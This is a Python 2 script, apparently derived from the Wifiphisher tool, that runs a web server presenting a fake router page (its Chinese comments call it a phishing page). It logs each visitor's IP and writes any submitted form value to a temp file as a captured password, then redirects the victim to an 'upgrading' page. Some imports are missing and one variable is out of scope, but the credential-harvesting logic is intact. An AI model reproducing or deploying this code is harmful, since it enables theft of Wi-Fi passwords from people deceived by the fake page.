# -*- coding:utf-8 -*-
import os
import SimpleHTTPServer
import BaseHTTPServer
from color import *

class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    """
    Request handler for the HTTP server that logs POST requests.
    """
    def do_QUIT(self):
        """
        Sends a 200 OK response, and sets server.stop to True
        """
        self.send_response(200)
        self.end_headers()
        self.server.stop = True

    def do_GET(self):

        if self.path == "/":
            with open("/tmp/wifiphisher-webserver.tmp", "a+") as log_file:
                log_file.write('[' + T + '*' + W + '] ' + O + "GET " + T +
                               self.client_address[0] + W + "\n"
                               )
                log_file.close()
            self.path = "index.html"
        self.path = "%s/%s" % (PHISING_PAGE, self.path)

        if self.path.endswith(".html"):
            if not os.path.isfile(self.path):
                self.send_response(404)
                return
            f = open(self.path)
            self.send_response(200)
            self.send_header('Content-type', 'text-html')
            self.end_headers()
            # Send file content to client
            self.wfile.write(f.read())
            f.close()
            return
        # Leave binary and other data to default handler.
        else:
            SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD': 'POST',
                     'CONTENT_TYPE': self.headers['Content-Type'],
                     })
        for item in form.list:
            if item.value:
                if re.match("\A[\x20-\x7e]+\Z", item.value):
                    self.send_response(301)
                    self.send_header('Location', '/upgrading.html')
                    self.end_headers()
                    with open("/tmp/wifiphisher-webserver.tmp", "a+") as log_file:
                        log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
                                       T + self.client_address[0] +
                                       R + " password=" + item.value +
                                       W + "\n"
                                       )
                        log_file.close()
                    return

    def log_message(self, format, *args):
        return

class HTTPServer(BaseHTTPServer.HTTPServer):
    """
    HTTP server that reacts to self.stop flag.
    """

    def serve_forever(self,PORT):
        """
        Handle one request at a time until stopped.
        """
        print '[' + T + '*' + W + '] Starting HTTP server at port ' + str(PORT)
        self.stop = False
        while not self.stop:
            self.handle_request()
            

def Start(IP="",PORT=8080,PHISING_PAGE="access-point-pages/minimal"):
    '''
       PHISING_PAGE--钓鱼页面相对脚本路径,默认打开该路径下的index.html,请注意根据情况更换minimal下的路由器界面文件
       IP 绑定的IP接口,""表示所有接口
       PORT 设置HttpServer的监听端口
    '''
    Handler = HTTPRequestHandler
    httpd=HTTPServer((IP, PORT), Handler) #
    httpd.serve_forever(PORT)
    ##-已取消--返回一个对象,启动http需要调用它的方法.serve_forever()



if __name__=='__main__':
    Start()

    
    
    














        
